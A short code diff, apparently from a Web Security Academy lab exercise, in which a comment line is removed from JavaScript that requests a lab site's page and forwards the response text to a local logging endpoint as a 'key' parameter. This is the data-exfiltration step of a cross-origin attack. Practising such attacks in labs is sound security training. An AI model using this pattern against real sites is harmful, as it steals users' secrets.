@@ -11,7 +11,7 @@
         var xhr = new XMLHttpRequest(); 
         var url = 'https://0a1b0084046695a180f7991a00d30053.web-security-academy.net';
        
-        // function on ready state
+          
         xhr.onreadystatechange = function (){
             if(xhr.readyState == XMLHttpRequest.DONE){
                 fetch('http://127.0.0.1:5555/log?key= ' + xhr.responseText)
